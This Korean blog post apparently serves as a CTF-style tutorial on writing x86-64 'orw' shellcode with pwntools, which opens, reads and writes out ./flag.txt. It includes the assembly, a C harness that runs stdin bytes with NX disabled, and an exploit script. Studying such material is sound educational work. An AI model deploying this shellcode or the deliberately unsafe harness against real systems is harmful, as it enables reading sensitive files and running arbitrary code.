+++
title = "orw shellcode"
date = "2023-08-30"
+++

# Introduction
`shellcode`는 특정 동작을 수행하는 *바이트 코드* 로써, 유저의 입력값을 실행할 수 있는 환경일 때 유용하게 활용될 수 있습니다.
이 포스트에서 살펴볼 `shellcode`는 **open**, **read**, **write** 를 수행하는 바이트 코드로, 일명 `orw shellcode` 입니다.

`orw shellcode`를 활용하면 아래의 동작을 수행할 수 있습니다.
> 1. [open](https://pubs.opengroup.org/onlinepubs/9699919799/functions/open.html)(path, flag, ...) 함수로 특정 파일을 열고 *file descriptor* 를 지정할 수 있습니다.
> 
> 2. [read](https://man7.org/linux/man-pages/man2/read.2.html)(fd, buf, count) 함수로 open 된 파일의 값을 읽을 수 있습니다.
> 
> 3. [write](https://man7.org/linux/man-pages/man2/write.2.html)(fd, buf, count) 함수로 읽은 파일의 내용을 특정 위치에 출력할 수 있습니다.


# Code
## craft shellcode
`shellcode`는 ***pwntools*** 의 [shellcraft](https://docs.pwntools.com/en/stable/shellcraft.html)를 이용하면 아래와 같이 간단히 만들 수 있습니다.

단, 여기서는 `64-bit` 환경임을 상정하고 쉘코드를 만들었습니다. 따라서, `context.arch = 'amd64'` 코드를 추가하여 이를 명시해주었습니다.

```python
from pwn import *

context.arch = 'amd64'

flag_path = b"./flag.txt"
buf = 'rsp'
size = 0x80

sc = shellcraft.open(flag_path)
sc += shellcraft.read('rax', buf, size)
sc += shellcraft.write(1, buf, size)
print(sc)

shellcode = asm(sc)
print(shellcode)
```

위 코드를 실행했을 때, `print(sc)`의 결과를 차근차근 살펴보면 아래와 같습니다.

유의해야 할 점은 `64-bit`환경에서의 **systemcall**을 할 때, 인자 순서에 따라 어느 레지스터에 들어가는지를 알고 있어야 한다는 점입니다.
이와 관련해서는 [syscall table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit) 을 참고하시면 좋습니다.

> *rdi*, *rsi*, *rdx*, ... 순서로 저장됨을 확인할 수 있습니다.

```asm
    /* open(file=b'./flag.txt', oflag=0, mode=0) */
    /* push b'./flag.txt\x00' */
    push 0x1010101 ^ 0x7478
    xor dword ptr [rsp], 0x1010101
    mov rax, 0x742e67616c662f2e
    push rax
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    push SYS_open /* 2 */
    pop rax
    syscall

    /* read('rax', 'rsp', 0x80) */
    mov rdi, rax
    xor eax, eax /* SYS_read */
    xor edx, edx
    mov dl, 0x80
    mov rsi, rsp
    syscall

    /* write(fd=1, buf='rsp', n=0x80) */
    push 1
    pop rdi
    xor edx, edx
    mov dl, 0x80
    mov rsi, rsp
    /* call write() */
    push SYS_write /* 1 */
    pop rax
    syscall
```

위 어셈블리어를 잘 읽어보면 `open`, `read`, `write` 에서 각 레지스터에 적절한 인자값들을 넣어주고 있음을 확인할 수 있습니다.

---

## shellcode.c

위 `shellcode`를 테스트하기 위해 아래와 같이, stdin 으로 입력받은 *바이트 코드* 를 실행해주는 c언어 코드를 작성합니다.

```C
#include <stdio.h>
#include <unistd.h>

int main() {
  // buffer for storing shellcode
  char shellcode[] = "";

  read(0, shellcode, 1024);

  void (*func)();

  // type conversion; char[] to function pointer
  func = (void (*)())shellcode;

  // execute shellcode
  func();

  return 0;
}
```

단, 위 코드를 이용해 코드를 실행하기 위해서는 `NX` 보호 기법을 해제해줘야 합니다.
따라서, 컴파일 옵션으로 `-z execstack`을 추가하여 스택 영역에서 코드 실행을 가능하게 해줍니다.

```bash
gcc -o shellcode shellcode.c -z execstack
```

---

## ex.py

***pwntools*** 를 이용해 `shellcode`를 주입하여 `orw` 를 수행하는 `ex.py` 코드는 아래와 같습니다.

```py
from pwn import *

context.arch = 'amd64'

flag_path = b"./flag.txt"
size = 0x80
buf = 'rsp'

sc = shellcraft.open(flag_path)
sc += shellcraft.read('rax', buf, size)
sc += shellcraft.write(1, buf, size)

shellcode = asm(sc)

p = process(b"./shellcode")

p.send(shellcode)
print(p.recv(64))
```

# Result
실행화면은 아래와 같습니다.

<center>
<img alt="result" src="../../pwnable/orw_shellcode/orw_shellcode_1.png" />
</center>

**FLAG** 값으로 `FLAG{open_read_write_shellcode_this_is_FLAG!}` 를 확인할 수 있습니다.

<script src="https://utteranc.es/client.js"
        repo="c0np4nn4/utterance_repo"
        issue-term="pathname"
        label="utterances"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
